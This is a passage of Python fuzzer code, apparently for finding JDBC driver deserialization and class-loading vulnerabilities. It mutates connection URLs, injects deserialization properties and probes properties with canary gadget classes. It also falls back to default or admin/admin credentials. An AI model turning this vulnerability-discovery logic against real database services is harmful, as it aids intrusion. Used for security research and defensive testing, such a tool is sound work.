        out["credentials"] = copy.deepcopy(target_info["default_creds"])

        # Only transfer params that are NOT driver-specific
        source_params = source_info.get("exploit_params", {})
        transferable = {k: v for k, v in source_params.items()
                        if k not in _DRIVER_SPECIFIC_PARAMS}
        # Also include target driver's own params for mixing
        target_params = target_info.get("exploit_params", {})
        transferable.update(target_params)

        if transferable:
            params = out.setdefault("url_params", {})
            if not isinstance(params, dict):
                params = {}
                out["url_params"] = params
            # Clear any stale driver-specific params from previous driver
            params = {k: v for k, v in params.items()
                      if k not in _DRIVER_SPECIFIC_PARAMS or k in target_params}
            out["url_params"] = params

            # Filter out empty value lists (stripped gadgets)
            usable = {k: v for k, v in transferable.items() if v}
            if usable:
                n_params = self.rng.randint(1, min(3, len(usable)))
                chosen = self.rng.sample(list(usable.keys()), n_params)
                for key in chosen:
                    params[key] = self.rng.choice(usable[key])

        # Only apply target driver's own deser properties (never cross-driver)
        target_deser = target_info.get("deser_properties", {})
        if target_deser:
            deser = out.setdefault("deser_properties", {})
            if not isinstance(deser, dict):
                deser = {}
                out["deser_properties"] = deser
            deser.update(copy.deepcopy(target_deser))

        return out

    # ------------------------------------------------------------------
    # C8: Deserialization property injection
    # ------------------------------------------------------------------

    def _deser_property_inject(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Inject deserialization-triggering connection properties."""
        out = self._get_ir(ir)
        driver = out.get("driver", "h2")

        # Filter property sets compatible with current driver
        compatible = [
            ps for ps in _DESER_PROPERTY_SETS
            if not ps.get("_drivers") or driver in ps["_drivers"].split(",")
        ]
        if not compatible:
            compatible = [ps for ps in _DESER_PROPERTY_SETS if not ps.get("_drivers")]
        if not compatible:
            return None

        prop_set = self.rng.choice(compatible)

        # Determine correct placement: if the prop key is a known url_param
        # for this driver, put it in url_params; otherwise deser_properties.
        driver_params = DRIVER_DATABASE.get(driver, {}).get("exploit_params", {})
        url_keys = {}
        deser_keys = {}
        for k, v in prop_set.items():
            if k == "_drivers":
                continue
            if k in driver_params:
                url_keys[k] = v
            else:
                deser_keys[k] = v

        if url_keys:
            params = out.setdefault("url_params", {})
            if not isinstance(params, dict):
                params = {}
                out["url_params"] = params
            params.update(url_keys)
        if deser_keys:
            deser = out.setdefault("deser_properties", {})
            if not isinstance(deser, dict):
                deser = {}
                out["deser_properties"] = deser
            deser.update(deser_keys)

        # Also try driver-specific deser properties
        info = DRIVER_DATABASE.get(driver, {})
        driver_deser = info.get("deser_properties", {})
        if driver_deser and self.rng.random() < 0.4:
            deser = out.setdefault("deser_properties", {})
            if not isinstance(deser, dict):
                deser = {}
                out["deser_properties"] = deser
            deser.update(copy.deepcopy(driver_deser))

        # 15% chance: substitute affinity-discovered sink classes into
        # confirmed class-loading properties
        class_loading_props = self._affinity_db.get_class_loading_properties(driver)
        if class_loading_props and self.rng.random() < 0.15:
            prop = self.rng.choice(class_loading_props)
            sink_classes = self._affinity_db.get_sink_classes(driver, prop)
            if sink_classes:
                params = out.setdefault("url_params", {})
                if isinstance(params, dict):
                    params[prop] = self.rng.choice(sink_classes)

        return out

    # ------------------------------------------------------------------
    # C9: Consistency fix
    # ------------------------------------------------------------------

    def _consistency_fix(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Ensure driver_class matches driver, fix incompatible params/pool."""
        out = self._get_ir(ir)
        driver = out.get("driver", "h2")
        info = DRIVER_DATABASE.get(driver)

        if not info:
            # Unknown driver, reset to h2
            out["driver"] = "h2"
            info = DRIVER_DATABASE["h2"]
            driver = "h2"

        # Fix driver_class
        expected_class = info["class"]
        if out.get("driver_class") != expected_class:
            # Allow alt_classes
            alt = info.get("alt_classes", [])
            if out.get("driver_class") not in alt:
                out["driver_class"] = expected_class

        # Fix jdbc_url prefix
        jdbc_url = out.get("jdbc_url", "")
        url_bases = info.get("url_base", [])
        if url_bases:
            # Check if current URL starts with any valid prefix for this driver
            prefix_match = False
            for base in url_bases:
                # Extract the scheme portion (e.g. "jdbc:h2:")
                parts = base.split("://")
                scheme = parts[0] if len(parts) > 1 else base.split(":")[0] + ":" + base.split(":")[1] + ":"
                if jdbc_url.startswith(scheme.split("//")[0] if "//" in scheme else scheme):
                    prefix_match = True
                    break
            if not prefix_match:
                out["jdbc_url"] = self.rng.choice(url_bases)

        # Remove url_params incompatible with current driver.
        # Driver-specific params from other drivers are noise — remove ALL.
        params = out.get("url_params", {})
        if isinstance(params, dict) and params:
            valid_keys = set(info.get("exploit_params", {}).keys())
            if valid_keys:
                incompatible = [k for k in params if k not in valid_keys]
                for k in incompatible:
                    del params[k]

        # Fix pool_config for current pool type
        pool = out.get("pool", "")
        if pool and pool in POOL_DATABASE:
            pool_info = POOL_DATABASE[pool]
            config = out.get("pool_config", {})
            if isinstance(config, dict):
                config["factory_class"] = pool_info["factory_class"]

        # Ensure credentials are present
        creds = out.get("credentials")
        if not isinstance(creds, dict):
            out["credentials"] = copy.deepcopy(info["default_creds"])

        return out

    # ------------------------------------------------------------------
    # C10: Exception-guided mutation
    # ------------------------------------------------------------------

    def _exception_guided(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Use exception hints to apply targeted corrections."""
        hint = self._last_exception_hint
        if not hint:
            # No hint available, do a mild consistency fix
            return self._consistency_fix(ir, corpus)

        out = self._get_ir(ir)
        exc_type = hint.get("type", "")
        exc_msg = hint.get("message", "").lower()

        if "class" in exc_type.lower() or "classnotfound" in exc_type.lower():
            # ClassNotFoundException → swap driver_class
            driver = out.get("driver", "h2")
            info = DRIVER_DATABASE.get(driver, {})
            alt_classes = info.get("alt_classes", [])
            if alt_classes:
                out["driver_class"] = self.rng.choice(alt_classes)
            else:
                # Try a different driver entirely
                new_driver = self.rng.choice(_DRIVER_NAMES)
                new_info = DRIVER_DATABASE[new_driver]
                out["driver"] = new_driver
                out["driver_class"] = new_info["class"]
                out["jdbc_url"] = self.rng.choice(new_info["url_base"])
                out["credentials"] = copy.deepcopy(new_info["default_creds"])

        elif "connection" in exc_msg and ("refused" in exc_msg or "timeout" in exc_msg):
            # Connection refused/timeout → switch to in-memory URL
            driver = out.get("driver", "h2")
            info = DRIVER_DATABASE.get(driver, {})
            url_bases = info.get("url_base", [])
            # Prefer mem/local URLs
            mem_urls = [u for u in url_bases if "mem" in u or "localhost" in u or "file:" in u]
            if mem_urls:
                out["jdbc_url"] = self.rng.choice(mem_urls)
            elif url_bases:
                out["jdbc_url"] = self.rng.choice(url_bases)

        elif "sql" in exc_msg or "syntax" in exc_msg or "parse" in exc_msg:
            # SQL error → try different SQL syntax for this driver
            driver = out.get("driver", "h2")
            out["sql_payload"] = self._random_sql_for_driver(driver)

            # Also try updating lifecycle hook SQL in pool config
            pool = out.get("pool", "")
            if pool and pool in POOL_DATABASE:
                pool_info = POOL_DATABASE[pool]
                hooks = pool_info.get("lifecycle_hooks", {})
                config = out.get("pool_config", {})
                if isinstance(config, dict):
                    for hook_name in hooks:
                        if hook_name in config:
                            config[hook_name] = self._random_sql_for_driver(driver)
                            break

        elif "security" in exc_msg or "access" in exc_msg or "denied" in exc_msg:
            # Security exception → record that we reached a sink
            out.setdefault("_reached_sinks", [])
            if isinstance(out.get("_reached_sinks"), list):
                fingerprint = hashlib.md5(
                    json.dumps(hint, sort_keys=True).encode()
                ).hexdigest()[:12]
                out["_reached_sinks"].append(fingerprint)

            # Try with elevated credentials
            out["credentials"] = {"user": "admin", "password": "admin"}

        elif "auth" in exc_msg or "login" in exc_msg or "password" in exc_msg:
            # Authentication error → try default creds for driver
            driver = out.get("driver", "h2")
            info = DRIVER_DATABASE.get(driver, {})
            out["credentials"] = copy.deepcopy(
                info.get("default_creds", {"user": "sa", "password": ""})
            )

        elif "driver" in exc_msg or "no suitable" in exc_msg:
            # No suitable driver → fix driver_class
            driver = out.get("driver", "h2")
            info = DRIVER_DATABASE.get(driver, {})
            out["driver_class"] = info["class"]

        else:
            # Unknown error → mild random mutation
            action = self.rng.choice(["swap_driver", "clear_params", "reset_pool"])
            if action == "swap_driver":
                return self._driver_swap(ir, corpus)
            elif action == "clear_params":
                out["url_params"] = {}
            elif action == "reset_pool":
                out["pool"] = ""
                out["pool_config"] = {}

        return out

    # ------------------------------------------------------------------
    # C11: Classpath probe — automatic discovery of class-loading properties
    # ------------------------------------------------------------------

    def _classpath_probe(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Probe a (property, class) combination to discover class-loading sinks.

        3-tier class selection:
        - Tier 1 (canary): Known-dangerous classes — used early or 30% of the time
        - Tier 2 (affinity): Classes from packages where loading succeeded before
        - Tier 3 (random): Random class from full classpath catalog
        """
        out = self._get_ir(ir)
        driver = out.get("driver", "h2")
        info = DRIVER_DATABASE.get(driver, {})

        # 1. Property selection: prefer confirmed class-loading properties
        class_props = self._affinity_db.get_class_loading_properties(driver)
        if not class_props:
            # Not yet discovered → try all exploit_params, excluding rejected ones
            all_props = list(info.get("exploit_params", {}).keys())
            class_props = [p for p in all_props
                           if not self._affinity_db.is_rejected(driver, p)]
            if not class_props:
                class_props = all_props  # fallback: retry everything
        if not class_props:
            return None

        prop = self.rng.choice(class_props)

        # 2. Class selection: 3-tier
        class_name = self._pick_probe_class(driver, prop)

        # 3. Inject
        params = out.setdefault("url_params", {})
        if not isinstance(params, dict):
            params = {}
            out["url_params"] = params
        params[prop] = class_name

        # Force no pool (C3P0 deser would confound attribution)
        out["pool"] = ""
        out["pool_config"] = {}
        # Clear SQL payload to isolate class-loading signal
        out["sql_payload"] = ""

        return out

    def _pick_probe_class(self, driver: str, prop: str) -> str:
        """3-tier class selection for classpath probing."""
        self._probe_iteration_count += 1

        # Tier 1: Canary/introspected (first 1K iterations or 30% chance)
        canaries = self._merged_canaries if self._merged_canaries else _CANARY_CLASSES
        if self._probe_iteration_count < 1000 or self.rng.random() < 0.3:
            return self.rng.choice(canaries)

        # Tier 2: Package-targeted (50% of remaining)
        known_pkgs = self._affinity_db.get_successful_packages(driver, prop)
        if known_pkgs and self.rng.random() < 0.5:
            pkg = self.rng.choice(known_pkgs)
            candidates = self._classpath_catalog.get_classes_in_package(pkg)
            if candidates:
                return self.rng.choice(candidates)

        # Tier 3: Random classpath
        if self._classpath_catalog.all_classes:
            return self.rng.choice(self._classpath_catalog.all_classes)

        # Fallback: canary/introspected
        return self.rng.choice(canaries)

    # ------------------------------------------------------------------
    # C12: Property discovery probe
    # ------------------------------------------------------------------

    # Drivers worth probing (have at least a few exploit_params)
    _DISCOVERY_DRIVERS = ["h2", "mysql", "postgresql", "hsqldb", "derby",
                          "mariadb", "oracle", "sqlserver",
                          "db2", "fabric_mysql", "modeshape"]
    # Number of canary probes per property before marking as rejected
    # With introspection: MySQL has 211 props, PgSQL 78 → many to probe.
    # Use 5 canaries per prop (covers top gadgets + some interface impls).
    _PROBES_PER_PROP = 5

    def _discovery_probe(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Level 1 auto-discovery: probe ALL properties with canary classes.

        Systematically injects a canary class into each unprobed property
        to discover which properties trigger Class.forName(). The feedback
        loop (engine → set_exception_hint → affinity DB) marks successful
        properties as confirmed class-loading props.

        Once all properties for a driver have been probed, this strategy
        falls through to C11 classpath_probe behavior.
        """
        out = self._get_ir(ir)

        # Pick a driver that still has unprobed properties
        driver = out.get("driver", "h2")
        # Hybrid: Phase 1 (exploitation) uses only DRIVER_DATABASE props,
        # Phase 2 (exploration) adds introspected candidates.
        in_exploration = self._total_mutate_calls >= self._EXPLORATION_PHASE_ITER
        unprobed = self._affinity_db.get_unprobed_properties(
            driver, self._introspection_db, include_introspected=in_exploration)

        if not unprobed:
            # Try other drivers with unprobed props
            candidates = []
            for d in self._DISCOVERY_DRIVERS:
                up = self._affinity_db.get_unprobed_properties(
                    d, self._introspection_db, include_introspected=in_exploration)
                if up:
                    candidates.append((d, up))
            if not candidates:
                # All properties probed — delegate to C11
                return self._classpath_probe(ir, corpus)
            driver, unprobed = self.rng.choice(candidates)
            # Switch driver in IR
            info = DRIVER_DATABASE.get(driver, {})
            out["driver"] = driver
            out["driver_class"] = info.get("class", "")
            url_bases = info.get("url_base", [])
            if url_bases:
                out["jdbc_url"] = self.rng.choice(url_bases)

        prop = self.rng.choice(unprobed)

        # Track probing state
        probe_key = (driver, prop)
        self._discovery_probe_counts[probe_key] = \
            self._discovery_probe_counts.get(probe_key, 0) + 1

        # After N probes with no confirmation → mark as probed (and rejected)
        if self._discovery_probe_counts[probe_key] >= self._PROBES_PER_PROP:
            self._affinity_db.mark_probed(driver, prop)
            if not self._affinity_db.is_confirmed_class_prop(driver, prop):
                self._affinity_db.mark_rejected(driver, prop)

        # Priority-ordered canary selection:
        # First _PROBES_PER_PROP probes use hardcoded canaries (highest hit rate),
        # only if more probes are needed do we dip into introspected classes.
        count = self._discovery_probe_counts[probe_key]
        boundary = self._canary_priority_boundary  # len(_CANARY_CLASSES)
        if count <= boundary:
            # Cycle through hardcoded canaries first
            class_name = _CANARY_CLASSES[count % len(_CANARY_CLASSES)]
        else:
            # Overflow: use full merged list
            canaries = self._merged_canaries if self._merged_canaries else _CANARY_CLASSES
            class_name = canaries[count % len(canaries)]

        # Inject
        params = out.setdefault("url_params", {})
        if not isinstance(params, dict):
            params = {}
            out["url_params"] = params
        params[prop] = class_name

        # Isolate signal: no pool, no SQL
        out["pool"] = ""
        out["pool_config"] = {}
        out["sql_payload"] = ""

        return out
